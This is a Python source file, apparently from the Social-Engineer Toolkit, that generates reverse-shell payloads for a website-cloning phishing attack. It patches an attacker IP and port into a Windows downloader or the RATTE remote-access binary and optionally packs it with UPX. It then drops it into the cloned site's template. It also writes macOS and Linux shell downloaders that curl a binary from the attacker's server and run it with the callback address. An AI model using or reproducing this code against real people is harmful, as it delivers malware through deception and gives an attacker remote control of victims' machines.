#!/usr/bin/python
###########################################
#
# Code behind the SET interactive shell
# and RATTE
#
###########################################
import os,sys,subprocess,re

definepath=os.getcwd()
sys.path.append("src/core")
try: import core
except: reload(core)
sys.path.append(definepath)

definepath=os.getcwd()

# check the config file
fileopen=file("config/set_config", "r")
for line in fileopen:
	line=line.rstrip()
        # define if we use upx encoding or not
        match=re.search("UPX_ENCODE=", line)
        if match:
                upx_encode=line.replace("UPX_ENCODE=", "")
        # set the upx flag
        match1=re.search("UPX_PATH=", line)
        if match1:
                upx_path=line.replace("UPX_PATH=", "")
                if upx_encode == "ON":
                        if not os.path.isfile(upx_path):
                                print "[*] UPX packer not found in the pathname specified in config. Disabling UPX packing for executable"
                                upx_encode == "OFF"

# make directory if it's not there
if not os.path.isfile("src/webattack/web_clone/site/template"): subprocess.Popen("mkdir src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null", shell=True).wait()

# grab ip address and SET web server interface
if os.path.isfile("src/program_junk/interface"):
	fileopen=file("src/program_junk/interface", "r")
	for line in fileopen: ipaddr=line.rstrip()
	if os.path.isfile("src/program_junk/ipaddr.file"):
			fileopen = file ("src/program_junk/ipaddr.file", "r")
			for line in fileopen: webserver=line.rstrip()

	if not os.path.isfile("src/program_junk/ipaddr.file"):
        	ipaddr=raw_input("Enter your IP address to connect back on for the reverse listener: ")

else:
	if os.path.isfile("src/program_junk/ipaddr.file"):
	        fileopen=file("src/program_junk/ipaddr.file", "r")
	        for line in fileopen: ipaddr=line.rstrip()
		webserver = ipaddr

# grab port options from payloadgen.py
if os.path.isfile("src/program_junk/port.options"):
        fileopen=file("src/program_junk/port.options", "r")
        for line in fileopen: 
		port = line.rstrip()
else: port = raw_input("Enter the port you want to use for the connection back: ")


# define the main variables here

# generate a random executable name per instance
exe_name = core.generate_random_string(10,10) + ".exe"

webserver = webserver + " " + port

webserver = exe_name + " " + webserver

# this is generated through payloadgen.py and lets SET know if its a RATTE payload or SET payload
if os.path.isfile("src/program_junk/set.payload"):
	fileopen=file("src/program_junk/set.payload", "r")
	for line in fileopen: payload_selection = line.rstrip()
else: payload_selection = "SETSHELL"


# determine if we want to target osx/nix as well
posix = False
# find if we selected it
if os.path.isfile("%s/src/program_junk/set.payload.posix" % (definepath)):
	# if we have then claim true
	posix = True
	# once we have flag, no longer needed
	#os.remove("%s/src/program_junk/set.payload.posix" % (definepath))

# if we selected the SET Interactive shell in payloadgen
if payload_selection == "SETSHELL":
	# replace ipaddress with one that we need for reverse connection back
	fileopen=open("src/payloads/set_payloads/downloader.windows" , "rb")
	data=fileopen.read()
	filewrite=open("src/program_junk/msf.exe" , "wb")
	host=int(len(exe_name)+1) * "X"
	webserver_count = int(len(webserver)+1) * "S"
	ipaddr_count = int(len(ipaddr)+1) * "M"
	filewrite.write(data.replace(str(host), exe_name+"\x00", 1))
	filewrite.close()
	fileopen=open("src/program_junk/msf.exe" , "rb")
	data=fileopen.read()
	filewrite=open("src/program_junk/msf.exe" , "wb")
	filewrite.write(data.replace(str(webserver_count), webserver+"\x00", 1))
	filewrite.close()
	fileopen=open("src/program_junk/msf.exe" , "rb")
	data=fileopen.read()
	filewrite=open("src/program_junk/msf.exe" , "wb")
	filewrite.write(data.replace(str(ipaddr_count), ipaddr+"\x00", 1))
	filewrite.close()

# if we selected RATTE in our payload selection
if payload_selection == "RATTE":
	fileopen=file("src/payloads/ratte/ratte.binary", "rb")
	data = fileopen.read()
        filewrite=open("src/program_junk/msf.exe", "wb")
        host=int(len(ipaddr)+1) * "X"
        rPort=int(len(str(port))+1) * "Y"
        filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
        filewrite.close()
        fileopen=open("src/program_junk/msf.exe", "rb")
        data = fileopen.read()
        filewrite=open("src/program_junk/msf.exe", "wb")
        filewrite.write(data.replace(str(rPort), str(port)+"\x00", 1))
        filewrite.close()

print "[*] Done, moving the payload into the action."

if upx_encode == "ON" or upx_encode == "on":
		# core upx
		core.upx("src/program_junk/msf.exe")

subprocess.Popen("cp src/program_junk/msf.exe src/webattack/web_clone/site/template/msf.exe 1> /dev/null 2> /dev/null", shell=True)
if payload_selection == "SETSHELL":
	subprocess.Popen("cp src/payloads/set_payloads/shell.windows src/webattack/web_clone/site/template/x 1> /dev/null 2> /dev/null", shell=True)
	#core.upx("src/webattack/web_clone/site/template/x")

# if we are targetting nix
if posix == True:
	print "[*] Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload..."
	filewrite = file("%s/src/webattack/web_clone/site/template/mac.bin" % (definepath), "w")
	payload_flags = webserver.split(" ")
	# grab osx binary name
	osx_name = core.generate_random_string(10,10)
	downloader = "#!/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
	filewrite.write(downloader)
	filewrite.close()
	# grab nix binary name
	linux_name = core.generate_random_string(10,10)
	downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
	filewrite = file("%s/src/webattack/web_clone/site/template/nix.bin" % (definepath), "w")
	filewrite.write(downloader)
	filewrite.close()
	subprocess.Popen("cp %s/src/payloads/set_payloads/shell.osx %s/src/webattack/web_clone/site/template/%s" % (definepath,definepath,osx_name), shell=True).wait()
	subprocess.Popen("cp %s/src/payloads/set_payloads/shell.linux %s/src/webattack/web_clone/site/template/%s" % (definepath,definepath,linux_name), shell=True).wait()
